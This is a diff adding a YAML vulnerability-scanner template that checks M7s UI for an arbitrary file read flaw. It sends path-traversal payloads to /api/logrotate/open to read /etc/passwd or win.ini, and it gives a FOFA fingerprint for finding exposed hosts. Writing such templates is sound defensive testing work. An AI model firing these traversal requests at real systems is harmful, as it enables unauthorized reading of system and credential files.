@@ -1,0 +1,30 @@
+id: poc-yaml-m7s-ui-download-anyfile-read
+
+info:
+  name: M7s UI Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  metadata:
+    finger: m7s-ui
+    fofa: body="static/js/chunk-libs.9540f991.js"
+
+variables:
+  paths:
+    - "../C://Windows/win.ini"
+    - "../../../../../../../../../../../etc/passwd"
+
+http:
+  - method: GET
+    path:
+      - "/api/logrotate/open?file={{paths}}"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "contains(body, 'root:') && contains(body, '/bin')"
+          - "contains(body, '[files]') && contains(body, 'bit app support')"
